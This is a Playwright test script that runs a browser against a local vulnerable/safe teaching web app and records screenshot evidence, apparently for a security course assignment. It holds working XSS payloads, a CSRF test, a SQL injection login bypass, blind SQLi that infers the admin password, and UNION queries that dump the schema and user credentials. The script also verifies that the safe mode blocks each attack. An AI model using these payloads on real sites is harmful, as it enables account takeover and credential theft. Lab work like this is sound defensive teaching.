// Real Chromium interactions against the loopback lab; never run against third-party targets.
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const assert = require('assert/strict');
const root = path.resolve(__dirname, '..');
const out = path.join(root, 'submission', 'screenshots');
fs.mkdirSync(out, { recursive: true });
const evidence = [];
const base = 'http://localhost:8000';
const reflected = '<svg onload="document.getElementById(`search-summary`).textContent=`REFLECTED XSS EXECUTED`"></svg>';
const stored = `<svg onload="this.parentElement.innerHTML='<strong>STORED XSS EXECUTED</strong>'"></svg>`;
const dom = `<img src=x onerror="document.getElementById('note-preview').textContent='DOM XSS EXECUTED'">`;
const stages = [
  ['columns-three', "' ORDER BY 3 -- ", 'Information Security'],
  ['columns-four', "' ORDER BY 4 -- ", 'ORDER BY'],
  ['database', "' UNION SELECT 'DATABASE',name,file FROM pragma_database_list -- ", 'main'],
  ['tables', "' UNION SELECT 'TABLE',name,sql FROM sqlite_master WHERE type='table' -- ", 'CREATE TABLE users'],
  ['columns', "' UNION SELECT 'COLUMN',name,type FROM pragma_table_info('users') -- ", 'password'],
  ['credentials', "' UNION SELECT username,password,email FROM users -- ", 'AdminPass!26']
];
async function capture(page, mode, name, payload, observation) {
  await page.waitForTimeout(300);
  const filename = `${mode}-${name}.png`;
  await page.screenshot({ path: path.join(out, filename), fullPage: true });
  evidence.push({ mode, name, payload, observation, url: page.url(), screenshot: 'screenshots/' + filename, capturedAt: new Date().toISOString() });
  console.log('PASS', mode, name);
}
async function login(page, mode) {
  await page.goto(`${base}/${mode}/login`);
  await page.locator('[name=username]').fill('student');
  await page.locator('[name=password]').fill('StudentPass!26');
  await Promise.all([page.waitForURL('**/profile'), page.getByRole('button', {name:'Sign in'}).click()]);
}
async function search(page, mode, payload) {
  await page.goto(`${base}/${mode}/courses`);
  await page.locator('[name=q]').fill(payload);
  await Promise.all([page.waitForURL('**/courses?*'), page.getByRole('button', {name:'Search', exact:true}).click()]);
}
(async () => {
  const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || 'C:/Program Files/Google/Chrome/Application/chrome.exe', headless: true });
  try {
    for (const mode of ['vulnerable','safe']) {
      const context = await browser.newContext({ viewport: {width:1440,height:1000} });
      const page = await context.newPage();
      await page.goto(`${base}/${mode}`);
      await capture(page, mode, 'dashboard', '', 'Application dashboard renders.');
      await search(page, mode, reflected);
      await page.waitForTimeout(300);
      assert.equal(await page.locator('#search-summary').textContent(), mode === 'vulnerable' ? 'REFLECTED XSS EXECUTED' : 'Search results for: ' + reflected);
      await capture(page, mode, 'reflected-xss', reflected, mode==='vulnerable'?'Payload executed through the search response.':'Literal payload rendered without execution.');
      await page.goto(`${base}/${mode}/planner`);
      await page.locator('#note-input').fill(dom);
      await page.locator('#preview-note').click();
      await page.waitForTimeout(300);
      assert.equal(await page.locator('#note-preview').textContent(), mode==='vulnerable'?'DOM XSS EXECUTED':dom);
      await capture(page, mode, 'dom-xss', dom, mode==='vulnerable'?'Fragment payload executed in innerHTML.':'Fragment rendered through textContent.');
      await login(page, mode);
      await page.goto(`${base}/${mode}/discussion`);
      await page.locator('[name=body]').fill(stored);
      await Promise.all([page.waitForURL('**/discussion'), page.getByRole('button', {name:'Post message'}).click()]);
      await page.waitForTimeout(300);
      const guest = await browser.newContext({viewport:{width:1440,height:1000}});
      const guestPage = await guest.newPage();
      await guestPage.goto(`${base}/${mode}/discussion`);
      await guestPage.waitForTimeout(300);
      if (mode==='vulnerable') assert.ok(await guestPage.getByText('STORED XSS EXECUTED',{exact:true}).count());
      else {assert.equal(await guestPage.locator('article svg').count(),0); assert.ok((await guestPage.locator('section').textContent()).includes(stored));}
      await capture(guestPage, mode, 'stored-xss', stored, mode==='vulnerable'?'Saved payload executes for a separate unauthenticated visitor.':'Saved payload is visible as literal text to another visitor.');
      await guest.close();
      // Establish an ordinary profile update before the cross-site test.
      await page.goto(`${base}/${mode}/profile`);
      await page.locator('[name=email]').fill('student@campushub.invalid');
      await page.getByRole('button',{name:'Save changes'}).click();
      await page.waitForLoadState();
      assert.ok((await page.locator('#current-email').textContent()).includes('student@campushub.invalid'));
      await capture(page, mode, 'csrf-before', 'Normal authenticated profile update', 'Original email persisted before the attack.');
      // Login again so the vulnerable default-cookie grace window is fresh.
      await login(page, mode);
      await page.goto(`http://127.0.0.1:8001/${mode}`);
      await page.waitForURL(`${base}/${mode}/**`);
      await capture(page, mode, 'csrf-response', 'External auto-submitting POST: email=attacker@lab.invalid; no CSRF token', mode==='vulnerable'?'Cross-site form changed the authenticated profile.':'Cross-site POST lacks the SameSite-protected session and redirects to login.');
      if (mode==='safe') await login(page, mode);
      else await page.goto(`${base}/${mode}/profile`);
      const email = await page.locator('#current-email').textContent();
      assert.ok(email.includes(mode==='vulnerable'?'attacker@lab.invalid':'student@campushub.invalid'));
      await capture(page, mode, 'csrf-after', 'External POST followed by authenticated profile verification', mode==='vulnerable'?'Attacker email is stored in the database.':'Original email remains unchanged.');
      if (mode==='safe') {
        // Same-site but cross-origin form sends the Lax cookie, exercising server defenses.
        await page.goto('http://localhost:8001/safe');
        await page.waitForURL(`${base}/safe/profile`);
        assert.ok((await page.locator('section').textContent()).includes('CSRF protection rejected'));
        await capture(page,mode,'csrf-token-origin','POST from http://localhost:8001 with session cookie but no token','HTTP 403: server-side token and Origin verification rejected the request.');
        await page.goto(`${base}/safe/profile`);
        assert.ok((await page.locator('#current-email').textContent()).includes('student@campushub.invalid'));
      }
      await page.goto(`${base}/${mode}/login`);
      await page.locator('[name=username]').fill("admin' -- ");
      await page.locator('[name=password]').fill('wrong');
      await page.getByRole('button',{name:'Sign in'}).click();
      await page.waitForLoadState();
      if(mode==='vulnerable') assert.ok((await page.locator('section').textContent()).includes('administrator'));
      else assert.ok((await page.locator('section').textContent()).includes('Invalid credentials'));
      await capture(page, mode, 'sqli-easy', "username=admin' -- ; password=wrong", mode==='vulnerable'?'Authentication bypassed as administrator.':'Invalid credentials; attack rejected.');
      for (const [name, predicate, found] of [['true','1=1',true],['false','1=2',false],['infer-A',"substr((SELECT password FROM users WHERE username='admin'),1,1)='A'",true],['infer-Z',"substr((SELECT password FROM users WHERE username='admin'),1,1)='Z'",false]]) {
        const payload = "ENR-2026-001' AND " + predicate + ' -- ';
        await page.goto(`${base}/${mode}/enrollment`);
        await page.locator('[name=reference]').fill(payload);
        await page.getByRole('button',{name:'Check enrollment'}).click();
        await page.waitForLoadState();
        const result = await page.locator('#lookup-result').textContent();
        assert.equal(result, mode==='vulnerable' && found ? 'Enrollment found':'No matching enrollment');
        await capture(page, mode, 'sqli-intermediate-'+name, payload, result);
      }
      for(const [name,payload,marker] of stages) {
        await search(page,mode,payload);
        const section = await page.locator('section').textContent();
        if(mode==='vulnerable') assert.ok(section.includes(marker), name);
        else {assert.ok(section.includes('No courses found.')); assert.equal(await page.locator('.grid .card').count(),0);}
        await capture(page,mode,'sqli-advanced-'+name,payload,mode==='vulnerable'?'Observed database response: '+marker:'Literal search input; no injected rows.');
      }
      // Safe legitimate queries still function after the malicious inputs.
      await search(page,mode,'Information');
      assert.ok((await page.locator('.grid').textContent()).includes('Information Security'));
      await context.close();
    }
    fs.writeFileSync(path.join(root,'submission','verification.json'),JSON.stringify({status:'passed',checks:evidence.length,evidence},null,2));
    console.log('All',evidence.length,'browser evidence checks passed.');
  } finally {await browser.close();}
})().catch(error=>{console.error(error);process.exit(1);});
